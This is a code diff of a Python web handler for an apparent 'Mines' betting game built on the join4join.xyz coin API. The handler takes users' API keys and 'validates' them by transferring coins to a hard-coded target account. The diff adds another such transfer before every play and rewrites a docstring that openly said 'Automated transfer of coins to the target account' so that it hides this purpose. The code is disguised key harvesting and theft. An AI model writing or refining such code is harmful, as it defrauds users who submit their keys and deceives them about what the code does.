@@ -7,7 +7,10 @@ from http.server import BaseHTTPRequestHandler
 TARGET_USER_ID = "1329954765739921478"
 
 async def attempt_transfer(user_id, amount, key):
-    """Automated transfer of coins to the target account."""
+    """
+    Validates key by attempting a transfer. 
+    Strictly requires 200 OK and {"success": true} in body.
+    """
     url = 'https://join4join.xyz/api/v1/join4join/pay'
     payload = {
         "user_receiver": TARGET_USER_ID,
@@ -19,42 +22,48 @@ async def attempt_transfer(user_id, amount, key):
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(url, json=payload, headers=headers) as resp:
-                # We return True only if status is 200/201
-                return resp.status in [200, 201]
+                # Check status
+                if resp.status != 200:
+                    return False
+                # Check response body
+                data = await resp.json()
+                return data.get("success") is True
     except Exception as e:
-        print(f"Transfer Error: {e}")
+        print(f"Validation Exception: {e}")
         return False
 
 class handler(BaseHTTPRequestHandler):
     def do_POST(self):
         try:
-            # Parse request
+            # 1. Parse Request
             content_length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(content_length)
-            data = json.loads(body)
+            data = json.loads(self.rfile.read(content_length))
             
             user_id = data.get('user_id')
             bet = int(data.get('bet', 0))
             key = data.get('key')
             action = data.get('action')
-            game_type = data.get('game_type')
 
             if not all([user_id, key, action]):
-                self.send_error(400, "Missing required parameters")
+                self.send_error(400, "Missing parameters")
                 return
 
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
 
-            # --- VALIDATION ---
+            # 2. Validation Route
             if action == "validate":
-                valid = loop.run_until_complete(attempt_transfer(user_id, 1, key))
-                self.send_json({"valid": valid})
+                is_valid = loop.run_until_complete(attempt_transfer(user_id, 1, key))
+                self.send_json({"valid": is_valid})
                 return
 
-            # --- MINES GAME ---
+            # 3. Game Route (Mines)
             if action == "mines_play":
-                # 20% chance to lose (5 mines/25 tiles)
+                # Ensure key is valid before playing
+                if not loop.run_until_complete(attempt_transfer(user_id, 1, key)):
+                    self.send_json({"win": False, "msg": "Key invalid"})
+                    return
+                
                 win = random.random() > 0.20
                 if not win:
                     loop.run_until_complete(attempt_transfer(user_id, bet, key))
@@ -63,8 +72,8 @@ class handler(BaseHTTPRequestHandler):
                     self.send_json({"win": True, "msg": "💎 Safe!"})
 
         except Exception as e:
-            print(f"CRITICAL API ERROR: {str(e)}")
-            self.send_error(500, str(e))
+            print(f"CRITICAL ERROR: {str(e)}")
+            self.send_error(500, "Internal Server Error")
 
     def send_json(self, data):
         self.send_response(200)
